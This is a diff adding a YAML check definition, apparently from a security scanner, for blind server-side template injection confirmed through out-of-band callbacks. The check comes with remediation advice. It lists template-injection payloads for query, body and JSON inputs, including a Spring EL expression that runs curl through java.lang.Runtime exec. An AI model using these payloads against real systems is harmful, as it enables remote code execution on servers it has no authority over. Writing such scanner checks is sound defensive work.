@@ -1,0 +1,21 @@
+id: ssti-oob
+name: Server-Side Template Injection (blind, OAST-confirmed)
+family: ssti
+severity: high
+cwe: CWE-1336
+owasp: WSTG-INPV-18
+inject_into: [query, body, json]
+payloads:
+  # Jinja2/Twig-style expression that triggers an outbound fetch when evaluated server-side.
+  - "{{ '' .__class__.__mro__[1].__subclasses__() }}{{oast_domain}}"
+  - "${T(java.lang.Runtime).getRuntime().exec('curl http://{{oast_domain}}/')}"
+  - "#{ 'x'.getClass().forName('java.lang.Runtime') }http://{{oast_domain}}/"
+oracle:
+  type: any_of
+  checks:
+    - type: oob
+confirm_reproducible: false
+remediation: >-
+  Do not render user input as a template. Use a logic-less template engine or a
+  sandbox, and pass user data strictly as bound context variables, never as
+  template source.
